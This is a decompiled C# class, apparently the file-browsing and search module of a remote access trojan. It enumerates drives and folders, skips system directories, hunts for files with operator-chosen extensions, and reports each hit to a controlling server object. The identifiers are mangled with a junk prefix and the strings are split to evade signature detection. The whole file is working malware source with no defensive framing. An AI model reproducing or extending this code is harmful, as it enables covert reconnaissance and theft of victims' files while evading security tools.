using System;
using System.Collections.Generic;
using System.IO;

namespace othvidtiraw;

internal class DRWARIVF
{
	public int othvidtirawfIndx = 0;

	public bool othvidtirawreaging = false;

	public List<string> othvidtirawsFiles = new List<string>();

	public MEWDRM iserver;

	public List<string> othvidtirawfExts = new List<string>();

	public List<string> othvidtirawnotFilders = new List<string>();

	public string othvidtirawmainPath;

	public int othvidtirawsIndx = 0;

	public string othvidtirawfilesLwogs = CEWZRNF.othvidtirawfilesLwogs;

	public bool othvidtirawsee_Acceess(string fPath)
	{
		DirectoryInfo directoryInfo = new DirectoryInfo(fPath);
		try
		{
			directoryInfo.GetDirectories();
			return true;
		}
		catch (Exception)
		{
			return false;
		}
	}

	public IEnumerable<string> othvidtirawadd_Fwee(string path)
	{
		Queue<string> moreFiles = new Queue<string>();
		moreFiles.Enqueue(path);
		while (moreFiles.Count > 0 && !iserver.othvidtirawauwtCnls)
		{
			path = moreFiles.Dequeue();
			try
			{
				string[] directories = Directory.GetDirectories(path);
				foreach (string text in directories)
				{
					if (othvidtirawsee_Acceess(text) && !othvidtirawnotFilders.Contains(text.ToLower()))
					{
						moreFiles.Enqueue(text);
					}
				}
			}
			catch
			{
			}
			string[] files = Directory.GetFiles(path);
			if (files != null)
			{
				for (int i = 0; i < files.Length; i++)
				{
					yield return files[i];
				}
			}
		}
	}

	public void othvidtirawloowk_File(string tempStr)
	{
		iserver.othvidtirawauwtCnls = false;
		othvidtirawfExts.Clear();
		othvidtirawsFiles.Clear();
		othvidtirawfIndx = 0;
		othvidtirawsIndx = 0;
		string[] array = tempStr.Split(new char[1] { '<' });
		if (array.Length <= 1)
		{
			return;
		}
		string[] array2 = array[0].Split(new char[1] { '>' });
		string[] array3 = array2;
		foreach (string text in array3)
		{
			if (text != "")
			{
				othvidtirawfExts.Add(text);
			}
		}
		if (array[1] != "")
		{
			othvidtirawreaging = true;
			othvidtirawsend_Sewarch(array[1]);
			othvidtirawreaging = false;
			iserver.othvidtirawpush_daeta(null, "othvidtiraw-seward=searwched|othvidtiraw".Split(new char[1] { '|' })[0]);
		}
	}

	public DRWARIVF()
	{
		othvidtirawnotFilders.Add("documents and settings|othvidtiraw".Split(new char[1] { '|' })[0]);
		othvidtirawnotFilders.Add("program files|othvidtiraw".Split(new char[1] { '|' })[0]);
		othvidtirawnotFilders.Add("system volume information|othvidtiraw".Split(new char[1] { '|' })[0]);
		othvidtirawnotFilders.Add("windows|othvidtiraw".Split(new char[1] { '|' })[0]);
		othvidtirawnotFilders.Add("program files (x86)|othvidtiraw".Split(new char[1] { '|' })[0]);
		othvidtirawnotFilders.Add("programdata|othvidtiraw".Split(new char[1] { '|' })[0]);
	}

	public string othvidtirawlookup_Driwve()
	{
		string text = "";
		DriveInfo[] drives = DriveInfo.GetDrives();
		DriveInfo[] array = drives;
		foreach (DriveInfo driveInfo in array)
		{
			if (driveInfo.IsReady)
			{
				text = text + driveInfo.Name + ">|othvidtiraw".Split(new char[1] { '|' })[0];
			}
		}
		return text;
	}

	public string othvidtirawcheck_Folwder(string path)
	{
		string text = "";
		if (Directory.Exists(path))
		{
			string[] directories = Directory.GetDirectories(path);
			foreach (string text2 in directories)
			{
				if (othvidtirawsee_Acceess(text2))
				{
					text = text + text2 + ">|othvidtiraw".Split(new char[1] { '|' })[0];
				}
			}
		}
		return text;
	}

	public void othvidtirawsend_Sewarch(string path)
	{
		try
		{
			foreach (string item in othvidtirawadd_Fwee(path))
			{
				string extension = Path.GetExtension(item);
				if (othvidtirawfExts.Contains(extension.ToLower()))
				{
					string text = iserver.othvidtirawfile_iwnfo(item, ret: true);
					iserver.othvidtirawpush_daeta(null, "othvidtiraw-sewarf=|othvidtiraw".Split(new char[1] { '|' })[0] + item + "<FIALE_AUATO<|othvidtiraw".Split(new char[1] { '|' })[0] + text);
				}
				if (iserver.othvidtirawauwtCnls)
				{
					break;
				}
			}
		}
		catch
		{
		}
	}

	public string othvidtirawlookup_wFile(string path)
	{
		string text = "";
		if (Directory.Exists(path))
		{
			string[] files = Directory.GetFiles(path);
			foreach (string text2 in files)
			{
				text = text + text2 + ">|othvidtiraw".Split(new char[1] { '|' })[0];
			}
		}
		return text;
	}
}
